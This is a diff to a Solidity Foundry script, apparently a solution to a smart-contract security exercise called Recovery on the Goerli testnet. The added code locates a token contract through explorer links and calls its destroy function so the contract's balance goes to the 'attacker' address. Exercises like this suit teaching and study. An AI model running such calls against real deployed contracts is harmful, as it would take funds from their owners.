@@ -21,7 +21,7 @@ contract RecoveryScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Recovery(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Recovery(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -45,5 +45,13 @@ contract RecoveryScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+
+        console.log("[Exploiting]");
+        console.log("searching in explorer...");
+        // https://goerli.etherscan.io/address/0x69D3ecbc4D952F694f6049e62b1eC891C1E72307#internaltx
+        // https://goerli.etherscan.io/address/0x226419bbe17b7f19a2d4899fccbfff9bd6d65f5d#internaltx
+        SimpleToken simple = SimpleToken(payable(0x226419BBE17B7f19a2D4899FCcbFfF9BD6D65F5D));
+        vm.broadcast(attacker);
+        simple.destroy(payable(attacker));
     }
 }
